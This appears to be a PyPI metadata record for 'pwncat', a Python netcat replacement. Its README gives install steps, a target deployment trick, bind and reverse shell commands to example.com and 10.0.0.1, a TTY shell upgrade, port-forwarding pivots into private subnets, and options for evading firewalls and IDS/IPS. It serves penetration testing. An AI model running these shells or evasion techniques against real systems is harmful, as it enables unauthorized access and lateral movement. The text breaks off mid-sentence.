{"info": {"author": "cytopia", "author_email": "cytopia@everythingcli.org", "bugtrack_url": null, "classifiers": ["Development Status :: 3 - Alpha", "Environment :: Console", "Intended Audience :: Developers", "Intended Audience :: Information Technology", "Intended Audience :: Science/Research", "Intended Audience :: System Administrators", "License :: OSI Approved :: MIT License", "Operating System :: OS Independent", "Programming Language :: Python", "Programming Language :: Python :: 2", "Programming Language :: Python :: 3", "Topic :: Communications :: Chat", "Topic :: Communications :: File Sharing", "Topic :: Internet", "Topic :: Security", "Topic :: System :: Shells", "Topic :: System :: Systems Administration", "Topic :: Utilities"], "description": "# pwncat\n\n**[Install](#tada-install)** |\n**[TL;DR](#coffee-tldr)** |\n**[Features](#star-features)** |\n**[Behaviour](#cop-behaviour)** |\n**[Docs](#closed_book-documentation)** |\n**[Usage](#computer-usage)** |\n**[Examples](#bulb-examples)** |\n**[FAQ](#information_source-faq)** |\n**[Contributing](#octocat-contributing)** |\n**[Disclaimer](#exclamation-disclaimer)** |\n**[License](#page_facing_up-license)**\n\n[![](https://img.shields.io/badge/code%20style-black-000000.svg)](https://github.com/psf/black)\n[![PyPI](https://img.shields.io/pypi/v/pwncat)](https://pypi.org/project/pwncat/)\n[![PyPI - Status](https://img.shields.io/pypi/status/pwncat)](https://pypi.org/project/pwncat/)\n[![PyPI - Python Version](https://img.shields.io/pypi/pyversions/pwncat)](https://pypi.org/project/pwncat/)\n[![PyPI - Format](https://img.shields.io/pypi/format/pwncat)](https://pypi.org/project/pwncat/)\n[![PyPI - Implementation](https://img.shields.io/pypi/implementation/pwncat)](https://pypi.org/project/pwncat/)\n[![PyPI - License](https://img.shields.io/pypi/l/pwncat)](https://pypi.org/project/pwncat/)\n\n[![Build Status](https://github.com/cytopia/pwncat/workflows/linting/badge.svg)](https://github.com/cytopia/pwncat/actions?workflow=linting)\n[![Build Status](https://github.com/cytopia/pwncat/workflows/building/badge.svg)](https://github.com/cytopia/pwncat/actions?workflow=building)\n\n\n> &nbsp;\n> #### Netcat on steroids with Firewall and IDS/IPS evasion, bind and reverse shell, port forwarding magic and scripting engine ([PSE](pse/)).\n> &nbsp;\n\n| :warning: Warning: it is currently in feature-incomplete alpha state. Expect bugs and options to change. ([Roadmap](https://github.com/cytopia/pwncat/issues/2)) |\n|---|\n\n<table border=\"0\" cellpadding=\"0\" cellspacing=\"0\" style=\"border-collapse:collapse; border:none;\">\n <thead>\n  <tr valign=\"top\" border=\"0\" cellpadding=\"0\" cellspacing=\"0\" style=\"border:none;\">\n   <th border=\"0\" cellpadding=\"0\" cellspacing=\"0\" style=\"border:none;\">Code Style</td>\n   <th border=\"0\" cellpadding=\"0\" cellspacing=\"0\" style=\"border:none;\"></td>\n   <th border=\"0\" cellpadding=\"0\" cellspacing=\"0\" style=\"border:none;\">Integration Tests</td>\n  </tr>\n </thead>\n <tbody>\n  <tr valign=\"top\" border=\"0\" cellpadding=\"0\" cellspacing=\"0\" style=\"border:none;\">\n   <td border=\"0\" cellpadding=\"0\" cellspacing=\"0\" style=\"border:none;\">\n    <table>\n     <thead>\n      <tr>\n       <th>Styler</th>\n       <th>Status</th>\n      </tr>\n     </thead>\n     <tbody>\n      <tr>\n       <td><a href=\"https://github.com/psf/black\">Black</a></td>\n       <td><a href=\"https://github.com/cytopia/pwncat/actions?workflow=black\"><img src=\"https://github.com/cytopia/pwncat/workflows/black/badge.svg\" /></a></td>\n      </tr>\n      <tr>\n       <td><a href=\"https://github.com/python/mypy\">mypy</a> <sup><small>[1]</small></sup></td>\n       <td><a href=\"https://github.com/cytopia/pwncat/actions?workflow=mypy\"><img src=\"https://github.com/cytopia/pwncat/workflows/mypy/badge.svg\" /></a></td>\n      </tr>\n      <tr>\n       <td><a href=\"https://github.com/PyCQA/pycodestyle\">pycodestyle</a></td>\n       <td><a href=\"https://github.com/cytopia/pwncat/actions?workflow=pycode\"><img src=\"https://github.com/cytopia/pwncat/workflows/pycode/badge.svg\" /></a></td>\n      </tr>\n      <tr>\n       <td><a href=\"https://github.com/PyCQA/pydocstyle\">pydocstyle</a></td>\n       <td><a href=\"https://github.com/cytopia/pwncat/actions?workflow=pydoc\"><img src=\"https://github.com/cytopia/pwncat/workflows/pydoc/badge.svg\" /></a></td>\n      </tr>\n      <tr>\n       <td><a href=\"https://github.com/PyCQA/pylint\">pylint</a></td>\n       <td><a href=\"https://github.com/cytopia/pwncat/actions?workflow=pylint\"><img src=\"https://github.com/cytopia/pwncat/workflows/pylint/badge.svg\" /></a></td>\n      </tr>\n     </tbody>\n    </table>\n   </td>\n   <td border=\"0\" cellpadding=\"0\" cellspacing=\"0\" style=\"border:none;\"></td>\n   <td border=\"0\" cellpadding=\"0\" cellspacing=\"0\" style=\"border:none;\">\n    <table>\n     <thead>\n      <tr>\n       <th><sub>Python</sub><sup>OS</sup></th>\n       <th>Linux</th>\n       <th>MacOS</th>\n       <th>Windows <sup><small>[2]</small></sup></th>\n      </tr>\n     </thead>\n     <tbody>\n      <tr>\n       <th>2.7</th>\n       <td><a href=\"https://github.com/cytopia/pwncat/actions?workflow=ubu-2.7\"><img src=\"https://github.com/cytopia/pwncat/workflows/ubu-2.7/badge.svg\" /></a></td>\n       <td><a href=\"https://github.com/cytopia/pwncat/actions?workflow=mac-2.7\"><img src=\"https://github.com/cytopia/pwncat/workflows/mac-2.7/badge.svg\" /></a></td>\n       <td><a href=\"https://github.com/cytopia/pwncat/actions?workflow=win-2.7\"><img src=\"https://github.com/cytopia/pwncat/workflows/win-2.7/badge.svg\" /></a></td>\n      </tr>\n      <tr>\n       <th>3.5</th>\n       <td><a href=\"https://github.com/cytopia/pwncat/actions?workflow=ubu-3.5\"><img src=\"https://github.com/cytopia/pwncat/workflows/ubu-3.5/badge.svg\" /></a></td>\n       <td><a href=\"https://github.com/cytopia/pwncat/actions?workflow=mac-3.5\"><img src=\"https://github.com/cytopia/pwncat/workflows/mac-3.5/badge.svg\" /></a></td>\n       <td><a href=\"https://github.com/cytopia/pwncat/actions?workflow=win-3.5\"><img src=\"https://github.com/cytopia/pwncat/workflows/win-3.5/badge.svg\" /></a></td>\n      </tr>\n      <tr>\n       <th>3.6</th>\n       <td><a href=\"https://github.com/cytopia/pwncat/actions?workflow=ubu-3.6\"><img src=\"https://github.com/cytopia/pwncat/workflows/ubu-3.6/badge.svg\" /></a></td>\n       <td><a href=\"https://github.com/cytopia/pwncat/actions?workflow=mac-3.6\"><img src=\"https://github.com/cytopia/pwncat/workflows/mac-3.6/badge.svg\" /></a></td>\n       <td><a href=\"https://github.com/cytopia/pwncat/actions?workflow=win-3.6\"><img src=\"https://github.com/cytopia/pwncat/workflows/win-3.6/badge.svg\" /></a></td>\n      </tr>\n      <tr>\n       <th>3.7</th>\n       <td><a href=\"https://github.com/cytopia/pwncat/actions?workflow=ubu-3.7\"><img src=\"https://github.com/cytopia/pwncat/workflows/ubu-3.7/badge.svg\" /></a></td>\n       <td><a href=\"https://github.com/cytopia/pwncat/actions?workflow=mac-3.7\"><img src=\"https://github.com/cytopia/pwncat/workflows/mac-3.7/badge.svg\" /></a></td>\n       <td><a href=\"https://github.com/cytopia/pwncat/actions?workflow=win-3.7\"><img src=\"https://github.com/cytopia/pwncat/workflows/win-3.7/badge.svg\" /></a></td>\n      </tr>\n      <tr>\n       <th>3.8</th>\n       <td><a href=\"https://github.com/cytopia/pwncat/actions?workflow=ubu-3.8\"><img src=\"https://github.com/cytopia/pwncat/workflows/ubu-3.8/badge.svg\" /></a></td>\n       <td><a href=\"https://github.com/cytopia/pwncat/actions?workflow=mac-3.8\"><img src=\"https://github.com/cytopia/pwncat/workflows/mac-3.8/badge.svg\" /></a></td>\n       <td><a href=\"https://github.com/cytopia/pwncat/actions?workflow=win-3.8\"><img src=\"https://github.com/cytopia/pwncat/workflows/win-3.8/badge.svg\" /></a></td>\n      </tr>\n      <tr>\n       <th>pypy2</th>\n       <td><a href=\"https://github.com/cytopia/pwncat/actions?workflow=ubu-py2\"><img src=\"https://github.com/cytopia/pwncat/workflows/ubu-py2/badge.svg\" /></a></td>\n       <td><a href=\"https://github.com/cytopia/pwncat/actions?workflow=mac-py2\"><img src=\"https://github.com/cytopia/pwncat/workflows/mac-py2/badge.svg\" /></a></td>\n       <td><a href=\"https://github.com/cytopia/pwncat/actions?workflow=win-py2\"><img src=\"https://github.com/cytopia/pwncat/workflows/win-py2/badge.svg\" /></a></td>\n      </tr>\n      <tr>\n       <th>pypy3</th>\n       <td><a href=\"https://github.com/cytopia/pwncat/actions?workflow=ubu-py3\"><img src=\"https://github.com/cytopia/pwncat/workflows/ubu-py3/badge.svg\" /></a></td>\n       <td><a href=\"https://github.com/cytopia/pwncat/actions?workflow=mac-py3\"><img src=\"https://github.com/cytopia/pwncat/workflows/mac-py3/badge.svg\" /></a></td>\n       <td><a href=\"https://github.com/cytopia/pwncat/actions?workflow=win-py3\"><img src=\"https://github.com/cytopia/pwncat/workflows/win-py3/badge.svg\" /></a></td>\n      </tr>\n     </tbody>\n    </table>\n   </td>\n  </tr>\n </tbody>\n<table>\n\n> <sup>[1] <a href=\"https://cytopia.github.io/pwncat/pwncat.type.html\">mypy type coverage</a> <strong>(fully typed: 93.51%)</strong></sup><br/>\n> <sup>[2] Windows builds are currently only failing, because they are simply stuck on GitHub actions.</sup>\n\n\n#### Motivation\nEver accidentally hit <kbd>Ctrl</kbd>+<kbd>c</kbd> on your reverse shell and it was gone for good?\nEver waited forever for your client to connect back to you, because the Firewall didn't let it out?\nEver had a connection loss because an IPS closed suspicious ports?\nEver were in need of a quick port forwarding?<br/>\n> **This one got you covered.**\n\nApart from that the current features of `nc`, `ncat` or `socat` just didn't feed my needs and I also wanted to have a single\ntool that works on older and newer machines (hence Python 2+3 compat). Most importantly I wanted to have it in a language that I can understand and provide my own features with.\n(Wait for it, binary releases for Linux, MacOS and Windows will come shortly).\n\n\n## :tada: Install\n```bash\npip install pwncat\n```\n\n\n## :coffee: TL;DR\n\nThis is just a quick get-you-started overview. For more advanced techniques see **[:computer: Usage](#computer-usage)** or **[:bulb: Examples](#bulb-examples)**.\n\n### Deploy to target\n```bash\n# Copy base64 data to clipboard from where you have internet access\ncurl https://raw.githubusercontent.com/cytopia/pwncat/master/bin/pwncat | base64\n\n# Paste it on the target machine\necho \"<BASE64 STRING>\" | base64 -d > pwncat\nchmod +x pwncat\n```\n\n### Summon shells\n```bash\n# Bind shell\npwncat -l -e '/bin/bash' 8080\n```\n```bash\n# Reverse shell (Ctrl+c proof)\npwncat -e '/bin/bash' example.com 4444 --recon --recon-wait 10\n```\n```bash\n# Reverse UDP shell (Ctrl+c proof)\npwncat -e '/bin/bash' example.com 4444 -u --ping-intvl 10\n```\n\n### Local port forward `-L` (listening proxy)\n```bash\n# Make remote MySQL server (remote port 3306) available on current machine\n# on every interface on port 5000\npwncat -L 0.0.0.0:5000 everythingcli.org 3306\n```\n```bash\n# Same, but convert traffic on your end to UDP\npwncat -L 0.0.0.0:5000 everythingcli.org 3306 -u\n```\n\n### Remote port forward `-R` (double client Proxy)\n```bash\n# Connect to Remote MySQL server (remote port 3306) and then connect to another\n# pwncat/netcat server on 10.0.0.1:4444 and bridge traffic\npwncat -R 10.0.0.1:4444 everythingcli.org 3306\n```\n```bash\n# Same, but convert traffic on your end to UDP\npwncat -R 10.0.0.1:4444 everythingcli.org 3306 -u\n```\n\n> <sub>[SSH Tunnelling for fun and profit :link:](https://www.everythingcli.org/ssh-tunnelling-for-fun-and-profit-local-vs-remote/)</sub><br/>\n> <sub>[`pwncat` example: Port forwarding magic](#port-forwarding-magic)<sub>\n\n\n## :star: Features\n\n### At a glance\n\n`pwncat` has many features, below is only a list of outstanding characteristics.\n\n| Feature        | Description |\n|----------------|-------------|\n| [PSE](pse)     | pwncat scripting engine to apply custom Python scripts for sent and/or received data |\n| Bind shell     | Create bind shells |\n| Reverse shell  | Create reverse shells |\n| Port Forward   | Local and remote port forward (Proxy server/client) |\n| <kbd>Ctrl</kbd>+<kbd>c</kbd> | Reverse shell can reconnect if you accidentally hit <kbd>Ctrl</kbd>+<kbd>c</kbd> |\n| Detect Egress  | Scan and report open egress ports on the target |\n| Evade FW       | Evade egress firewalls by round-robin outgoing ports |\n| Evade IPS      | Evade Intrusion Prevention Systems by being able to round-robin outgoing ports on connection interrupts |\n| UDP rev shell  | Try this with the traditional `netcat` |\n| TCP / UDP      | Full TCP and UDP support |\n| Python 2+3     | Works with Python 2 and Python 3 |\n| Cross OS       | Should work on Linux, MacOS and Windows as long as Python is available |\n| Compatability  | Use the traditional `netcat` as a client or server together with `pwncat` |\n\n\n### Feature comparison matrix\n\n|                     | pwncat | netcat | ncat |\n|---------------------|--------|---------|-----|\n| Scripting engine    | Python | :x:     | Lua |\n| IP ToS              | :x:    | \u2714       | :x: |\n| IPv4                | \u2714      | \u2714       | \u2714   |\n| IPv6                | *      | \u2714       | \u2714   |\n| Unix domain sockets | :x:    | \u2714       | \u2714   |\n| TCP                 | \u2714      | \u2714       | \u2714   |\n| UDP                 | \u2714      | \u2714       | \u2714   |\n| SCTP                | :x:    | :x:     | \u2714   |\n| Command exec        | \u2714      | \u2714       | \u2714   |\n| Inbound port scan   | *      | \u2714       | \u2714   |\n| Outbound port scan  | *      | :x:     | :x: |\n| Hex dump            | *      | \u2714       | \u2714   |\n| Telnet              | :x:    | \u2714       | \u2714   |\n| SSL                 | :x:    | :x:     | \u2714   |\n| HTTP                | *      | :x:     | :x: |\n| HTTPS               | *      | :x:     | :x: |\n| Chat                | \u2714      | \u2714       | \u2714   |\n| Broker              | :x:    | :x:     | \u2714   |\n| Simultaneous conns  | :x:    | :x:     | \u2714   |\n| Allow/deny          | :x:    | :x:     | \u2714   |\n| Local port forward  | \u2714      | :x:     | :x: |\n| Remote port forward | \u2714      | :x:     | :x: |\n| Re-accept           | \u2714      | \u2714       | \u2714   |\n| Proxy               | :x:    | \u2714       | \u2714   |\n| UDP reverse shell   | \u2714      | :x:     | :x: |\n| Respawning client   | \u2714      | :x:     | :x: |\n| Port hopping        | *      | :x:     | :x: |\n| Emergency shutdown  | \u2714      | :x:     | :x: |\n\n> <sup>`*` Feature is currently under development.\n\n\n## :cop: Behaviour\n\nLike the original implementation of `netcat`, when using **TCP**, `pwncat`\n(in client and listen mode) will automatically quit, if the network connection has been terminated,\nproperly or improperly.\n\nIn case the remote peer does not terminate the connection, or in **UDP** mode, `pwncat` will stay open.\n\nHave a look at the following illustratoins to better understand the behaviour:\n\n```bash\n# [Valid HTTP request] Does not quit, web server keeps connection intact\nprintf \"GET / HTTP/1.1\\n\\n\" | pwncat www.google.com 80\n```\n\n```bash\n# [Invalid HTTP request] Quits, because the web server closes the connection\nprintf \"GET / \\n\\n\" | pwncat www.google.com 80\n```\n\n```bash\n# [TCP]\n# Neither of both, client and server will quit after successful transfer\n# and they will be stuck, waiting for more input or output.\n# When exiting one (e.g.: via Ctrl+c), the other one will quit as well.\npwncat -l 4444 > output.txt\npwncat localhost 4444 < input.txt\n```\n\n```bash\n# [UDP]\n# Neither of both, client and server will quit after successful transfer\n# and they will be stuck, waiting for more input or output.\n# When exiting one (e.g.: via Ctrl+c), the other one will still stay open in UDP mode.\npwncat -u -l 4444 > output.txt\npwncat -u localhost 4444 < input.txt\n```\n\nThere are many ways to alter this default behaviour. Have a look at the [usage](#computer-usage)\nsection for more advanced adjustments.\n\n\n## :closed_book: Documentation\n\nDocumentation will evolve over time.\n\n* API docs can be found here: [pwncat.api.html](https://cytopia.github.io/pwncat/pwncat.api.html)\n* Python type coverage can be found here: [pwncat.type.html](https://cytopia.github.io/pwncat/pwncat.type.html)\n* HTML man page can be found here: [pwncat.man.html](https://cytopia.github.io/pwncat/pwncat.man.html)\n* Raw man page can be found here: [pwncat.1](man/pwncat.1)\n\n\n## :computer: Usage\n\nType `pwncat -h` or click below to see all available options.\n\n<details>\n  <summary><strong>Click here to expand usage</strong></summary>\n\n```\nusage: pwncat [-Cnuv] [-e cmd] hostname port\n       pwncat [-Cnuv] [-e cmd] -l [hostname] port\n       pwncat [-Cnuv] -z hostname port\n       pwncat [-Cnuv] -L addr:port hostname port\n       pwncat [-Cnuv] -R addr:port hostname port\n       pwncat -V, --version\n       pwncat -h, --help\n\n\nEnhanced and comptaible Netcat implementation written in Python (2 and 3) with\nconnect, zero-i/o, listen and forward modes and techniques to detect and evade\nfirewalls and intrusion detection/prevention systems.\n\nIf no mode arguments are specified, pwncat will run in connect mode and act as\na client to connect to a remote endpoint. If the connection to the remote\nendoint is lost, pwncat will quit. See advanced options for how to automatically\nreconnect.\n\npositional arguments:\n  hostname              Address to listen, forward or connect to\n  port                  Port to listen, forward or connect to\n\nmode arguments:\n  -l, --listen          [Listen mode]:\n                        Start a server and listen for incoming connections.\n                        If using TCP and a connected client disconnects or the\n                        connection is interrupted otherwise, the server will\n                        quit. See -k/--keep-open to change this behaviour.\n\n  -z, --zero            [Zero-I/0 mode]:\n                        Connect to a remote endpoint and report status only.\n                        Used for port scanning.\n\n  -L addr:port, --local addr:port\n                        [Local forward mode]:\n                        This mode will start a server and a client internally.\n                        The internal server will listen locally on specified\n                        hostname/port (positional arguments). Same as with -l.\n                        The server will then forward traffic to the internal\n                        client which connects to another server specified by\n                        address given via -L/--local addr:port.\n                        (I.e.: proxies a remote service to a local address)\n\n  -R addr:port, --remote addr:port\n                        [Remote forward mode]:\n                        This mode will start two clients internally. One is\n                        connecting to the target and one is connecting to\n                        another pwncat/netcat server you have started some-\n                        where. Once connected, it will then proxy traffic\n                        between you and the target.\n                        This mode should be applied on machines that block\n                        incoming traffic and only allow outbound.\n                        The connection to your listening server is given by\n                        -R/--remote addr:port and the connection to the\n                        target machine via the positional arguments.\n\noptional arguments:\n  -e cmd, --exec cmd    Execute shell command. Only for connect or listen mode.\n  -C lf, --crlf lf      Specify, 'lf', 'crlf' or 'cr' to always force replacing\n                        line endings for input and outout accordingly. Specify\n                        'no' to completely remove any line feeds. By default\n                        it will not replace anything and takes what is entered\n                        (usually CRLF on Windows, LF on Linux and some times\n                        CR on MacOS).\n  -n, --nodns           Do not resolve DNS.\n  -u, --udp             Use UDP for the connection instead of TCP.\n  -v, --verbose         Be verbose and print info to stderr. Use -v, -vv, -vvv\n                        or -vvvv for more verbosity. The server performance will\n                        decrease drastically if you use more than three times.\n  -c str, --color str   Colored log output. Specify 'always', 'never' or 'auto'.\n                        In 'auto' mode, color is displayed as long as the output\n                        goes to a terminal. If it is piped into a file, color\n                        will automatically be disabled. This mode also disables\n                        color on Windows by default. (default: auto)\n\nadvanced arguments:\n  --script-send file    All modes (TCP and UDP):\n                        A Python scripting engine to define your own custom\n                        transformer function which will be executed before\n                        sending data to a remote endpoint. Your file must\n                        contain the exact following function which will:\n                        be applied as the transformer:\n                        def transform(data):\n                            # NOTE: the function name must be 'transform'\n                            # NOTE: the function param name must be 'data'\n                            # NOTE: indentation must be 4 spaces\n                            # ... your transformations goes here\n                            return data\n                        You can also define as many custom functions or classes\n                        within this file, but ensure to prefix them uniquely to\n                        not collide with pwncat's function or classes, as the\n                        file will be called with exec().\n\n  --script-recv file    All modes (TCP and UDP):\n                        A Python scripting engine to define your own custom\n                        transformer function which will be executed after\n                        receiving data from a remote endpoint. Your file must\n                        contain the exact following function which will:\n                        be applied as the transformer:\n                        def transform(data):\n                            # NOTE: the function name must be 'transform'\n                            # NOTE: the function param name must be 'data'\n                            # NOTE: indentation must be 4 spaces\n                            # ... your transformations goes here\n                            return data\n                        You can also define as many custom functions or classes\n                        within this file, but ensure to prefix them uniquely to\n                        not collide with pwncat's function or classes, as the\n                        file will be called with exec().\n\n  --http                Connect / Listen / Local forward mode (TCP only):\n                        Hide traffic in http packets to fool Firewalls/IDS/IPS.\n\n  --https               Connect / Listen / Local forward mode (TCP only):\n                        Hide traffic in https packets to fool Firewalls/IDS/IPS.\n\n  -k, --keep-open       Listen mode (TCP only):\n                        Re-accept new clients in listen mode after a client has\n                        disconnected or the connection is unterrupted otherwise.\n                        (default: server will quit after connection is gone)\n\n  --rebind x            Listen mode (TCP and UDP):\n                        If the server is unable to bind, it will re-initialize\n                        itself x many times before giving up. Use -1 to re-init\n                        endlessly. (default: fail after first unsuccessful try).\n\n  --rebind-wait s       Listen mode (TCP and UDP):\n                        Wait x seconds between re-initialization. (default: 1)\n\n  --rebind-robin port   Listen mode (TCP and UDP):\n                        If the server is unable to initialize (e.g: cannot bind\n                        and --rebind is specified, it it will shuffle ports in\n                        round-robin mode to bind to. Use comma separated string\n                        such as '80,81,82' or a range of ports '80-100'.\n                        Set --rebind to at least the number of ports to probe +1\n                        This option requires --rebind to be specified.\n\n  --reconn x            Connect mode / Zero-I/O mode (TCP only):\n                        If the remote server is not reachable or the connection\n                        is interrupted, the client will connect again x many\n                        times before giving up. Use -1 to retry endlessly.\n                        (default: quit if the remote is not available or the\n                        connection was interrupted)\n                        This might be handy for stable TCP reverse shells ;-)\n\n  --reconn-wait s       Connect mode / Zero-I/O mode (TCP only):\n                        Wait x seconds between re-connects. (default: 1)\n\n  --reconn-robin port   Connect mode / Zero-I/O mode (TCP only):\n                        If the remote server is not reachable or the connection\n                        is interrupted and --reconn is specified, the client\n                        will shuffle ports in round-robin mode to connect to.\n                        Use comma separated string such as '80,81,82' or a range\n                        of ports '80-100'.\n                        Set --reconn to at least the number of ports to probe +1\n                        This helps reverse shell to evade intrusiona prevention\n                        systems that will cut your connection and block the\n                        outbound port.\n                        This is also useful in Connect or Zero-I/O mode to\n                        figure out what outbound ports are allowed.\n\n  -w s, --wait s        Connect mode (TCP only):\n                        If a connection and stdin are idle for more than s sec,\n                        then the connection is silently closed and the client\n                        will exit. (default: wait forever).\n                        Note: if --reconn is specified, the connection will be\n                        re-opened.\n\n  --ping-init           Connect mode / Zero-I/O mode (TCP and UDP):\n                        UDP is a stateless protocol unlike TCP, so no hand-\n                        shake communication takes place and the client just\n                        sends data to a server without being \"accepted\" by\n                        the server first.\n                        This means a server waiting for an UDP client to\n                        connect to, is unable to send any data to the client,\n                        before the client hasn't send data first. The server\n                        simply doesn't know the IP address before an initial\n                        connect.\n                        The --ping-init option instructs the client to send one\n                        single initial ping packet to the server, so that it is\n                        able to talk to the client.\n                        This is the only way to make a UDP reverse shell work.\n                        See --ping-word for what char/string to send as initial\n                        ping packet (default: '\\0')\n\n  --ping-intvl s        Connect mode / Zero-I/O mode (TCP and UDP):\n                        Instruct the client to send ping intervalls every s sec.\n                        This allows you to restart your UDP server and just wait\n                        for the client to report back in. This might be handy\n                        for stable UDP reverse shells ;-)\n                        See --ping-word for what char/string to send as initial\n                        ping packet (default: '\\0')\n\n  --ping-word str       Connect mode / Zero-I/O mode (TCP and UDP):\n                        Change the default character '\\0' to use for upd ping.\n                        Single character or strings are supported.\n\n  --ping-robin port     Connect mode / Zero-I/O mode (TCP and UDP):\n                        Instruct the client to shuffle the specified ports in\n                        round-robin mode for a remote server to ping.\n                        This might be handy to scan outbound allowed ports.\n                        Use --ping-intvl 0 to be faster.\n\n  --safe-word str       All modes:\n                        If pwncat is started with this argument, it will shut\n                        down as soon as it receives the specified string. The\n                        --keep-open (server) or --reconn (client) options will\n                        be ignored and it won't listen again or reconnect to you.\n                        Use a very unique string to not have it shut down\n                        accidentally by other input.\n\nmisc arguments:\n  -h, --help            Show this help message and exit\n  -V, --version         Show version information and exit\n```\n</details>\n\n\n## :bulb: Examples\n\n### Upgrade your shell to interactive\n<!--\n<details>\n  <summary>Click to expand</summary>\n-->\n\n> This is a universal advice and not only works with `pwncat`, but with all other common tools.\n\nWhen connected with a reverse or bind shell you'll notice that no interactive commands will work and\nhitting <kbd>Ctrl</kbd>+<kbd>c</kbd> will terminate your session.\nTo fix this, you'll need to attach it to a TTY. Here's how:\n```bash\npython3 -c 'import pty; pty.spawn(\"/bin/bash\")'\n```\n<kbd>Ctrl</kbd>+<kbd>z</kbd>\n```bash\nstty size\nstty echo -raw\nfg\nreset\nexport SHELL=bash\nexport TERM=xterm\nstty rows <num> columns <num>   # values found above by 'stty size'\n```\n<!--\n</details>\n-->\n\n### Unbreakable UDP reverse shell\n\n<!--\n<details>\n  <summary>Click to expand</summary>\n-->\n\nWhy unbreakable? Because it will keep coming to you, even if you kill your listening server temporarily.\n```bash\n# The client\n# --exec            # Provide this executable\n# --nodns           # Keep the noise down and don't resolve hostnames\n# --udp             # Use UDP mode\n# --ping-intvl      # Ping the server every 10 seconds\n\npwncat --exec /bin/bash --nodns --udp --ping-intvl 10 10.0.0.1 4444\n```\nIf you feel like, you can start your listener in full TRACE logging mode to figure out what's going on\n```bash\n# The server\n# -u   # Use UDP mode\n# -l   # Listen for incoming connections\npwncat -u -l -vvvvv\n```\nYou will see (among all the gibberish) a TRACE message:\n```\n[DEBUG] NetcatServer.receive(): 'Client connected: 10.0.0.105:43213'\n```\nAs soon as you saw this on the listener, you can issue commands to the client.\nAll the debug messages are also not necessary, so you can safely <kbd>Ctrl</kbd>+<kbd>c</kbd> terminate\nyour server and start it again in silent mode:\n```bash\n# The server\npwncat -u -l -vvvvv\n```\nNow wait a maximum of 10 seconds and you can issue commands.\nHaving no info messages at all, is also troublesome. You might want to know what is going\non behind the scences or? Safely <kbd>Ctrl</kbd>+<kbd>c</kbd> terminate your server and redirect\nthe notifications to a logfile:\n```bash\n# The server\n# 2> comm.txt   # This redirects the messages to a logfile instead\npwncat -u -l -vvv 2> comm.txt\n```\nNow all you'll see in your server window are the actual command inputs and outputs.\nIf you want to see what's going on behind the scene, open a second terminal window and tail\nthe `comm.txt` file:\n```\n# View communication info\ntail -fn50 comm.txt\n\n[DEBUG] NetcatServer.receive(): 'Client connected: 10.0.0.105:52167'\n[DEBUG] NetcatServer.receive(): 'Client connected: 10.0.0.105:52167'\n[DEBUG] NetcatServer.receive(): 'Client connected: 10.0.0.105:52167'\n[DEBUG] NetcatServer.receive(): 'Client connected: 10.0.0.105:52167'\n[DEBUG] NetcatServer.receive(): 'Client connected: 10.0.0.105:52167'\n```\n<!--\n</details>\n-->\n\n### Port forwarding magic\n\n<!--\n<details>\n  <summary>Click to expand</summary>\n-->\n\n#### Local TCP port forwarding\n\n**Scenario**\n1. Alice can be reached from the Outside (TCP/UDP)\n2. Bob can only be reached from Alice's machine\n```\n                              |                               |\n        Outside               |           DMZ                 |        private subnet\n                              |                               |\n                              |                               |\n     +-----------------+     TCP     +-----------------+     TCP     +-----------------+\n     | The cat         | -----|----> | Alice           | -----|----> | Bob             |\n     |                 |      |      | pwncat          |      |      | MySQL           |\n     | 56.0.0.1        |      |      | 72.0.0.1:3306   |      |      | 10.0.0.1:3306   |\n     +-----------------+      |      +-----------------+      |      +-----------------+\n     pwncat 72.0.0.1 3306     |      pwncat \\                 |\n                              |        -L 72.0.0.1:3306 \\     |\n                              |         10.0.0.1 3306         |\n```\n\n#### Local UDP port forwarding\n\n**Scenario**\n1. Alice can be reached from the Outside (but only via UDP)\n2. Bob can only be reached from Alice's machine\n```\n                              |                               |\n        Outside               |           DMZ                 |        private subnet\n                              |                               |\n                              |                               |\n     +-----------------+     UDP     +-----------------+     TCP     +-----------------+\n     | The cat         | -----|----> | Alice           | -----|----> | Bob             |\n     |                 |      |      | pwncat -L       |      |      | MySQL           |\n     | 56.0.0.1        |      |      | 72.0.0.1:3306   |      |      | 10.0.0.1:3306   |\n     +-----------------+      |      +-----------------+      |      +-----------------+\n     pwncat -u 72.0.0.1 3306  |      pwncat -u \\              |\n                              |        -L 72.0.0.1:3306 \\     |\n                              |        10.0.0.1 3306          |\n```\n\n#### Remote TCP port forward\n\n**Scenario**\n1. Alice cannot be reached from the Outside\n2. Alice is allowed to connect to the Outside (TCP/UDP)\n3. Bob can only be reached from Alice's machine\n```\n                              |                               |\n        Outside               |           DMZ                 |        private subnet\n                              |                               |\n                              |                               |\n     +-----------------+     TCP     +-----------------+     TCP     +-----------------+\n     | The cat         | <----|----- | Alice           | -----|----> | Bob             |\n     |                 |      |      | pwncat          |      |      | MySQL           |\n     | 56.0.0.1        |      |      | 72.0.0.1:3306   |      |      | 10.0.0.1:3306   |\n     +-----------------+      |      +-----------------+      |      +-----------------+\n     pwncat -l 4444           |      pwncat --reconn \\        |\n                              |        -R 56.0.0.1:4444 \\     |\n                              |        10.0.0.1 3306          |\n```\n\n#### Remote UDP port forward\n\n**Scenario**\n1. Alice cannot be reached from the Outside\n2. Alice is allowed to connect to the Outside (UDP: DNS only)\n3. Bob can only be reached from Alice's machine\n```\n                              |                               |\n        Outside               |           DMZ                 |        private subnet\n                              |                               |\n                              |                               |\n     +-----------------+     UDP     +-----------------+     TCP     +-----------------+\n     | The cat         | <----|----- | Alice           | -----|----> | Bob             |\n     |                 |      |      | pwncat          |      |      | MySQL           |\n     | 56.0.0.1        |      |      | 72.0.0.1:3306   |      |      | 10.0.0.1:3306   |\n     +-----------------+      |      +-----------------+      |      +-----------------+\n     pwncat -u -l 53          |      pwncat -u --reconn \\     |\n                              |        -R 56.0.0.1:4444 \\     |\n                              |        10.0.0.1 3306          |\n```\n<!--\n</details>\n-->\n\n### Pwncat Scripting Engine ([PSE](pse))\n\n`pwncat` offers a Python based scripting engine to inject your custom code before sending and\nafter receiving data.\n\n#### How it works\n\nYou will simply need to provide a Python file with the following function:\n```python\ndef transform(data):\n    # Example to reverse a string\n    return data[::-1]\n```\nBoth, the function name must be named `transform` and the parsed argument name must be `data`.\nOther than that you can add as much code as you like. Each instance of `pwncat` can take two scripts:\n\n1. `--script-send`: script will be applied before sending\n2. `--script-recv`: script will be applied after receiving\n\n\n#### Example 1: Self-built asymmetric encryption\n\n> PSE: [asym-enc](pse/asym-enc) source code\n\nThis will encrypt your traffic asymmetrically. It is just a very basic [ROT13](https://en.wikipedia.org/wiki/ROT13) implementation with different shift lengths on both sides to 